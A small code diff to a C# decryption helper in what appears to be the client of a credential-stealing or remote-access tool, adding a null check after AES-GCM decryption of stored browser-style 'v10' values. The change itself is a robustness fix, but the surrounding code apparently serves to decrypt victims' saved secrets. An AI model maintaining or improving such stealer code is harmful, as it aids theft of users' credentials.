@@ -233,6 +233,11 @@ namespace Pulsar.Client.Kematian.HelpingMethods.Decryption
                         {
                             var aes = new AesGcmBetter();
                             byte[] decrypted = aes.Decrypt(_key, iv, null, encData, tag);
+
+                            if (decrypted == null)
+                            {
+                                return "";
+                            }
                             
                             // For v10 the actual value starts after a 32-byte prefix
                             if (encValue[2] == '0' && decrypted.Length > 32)
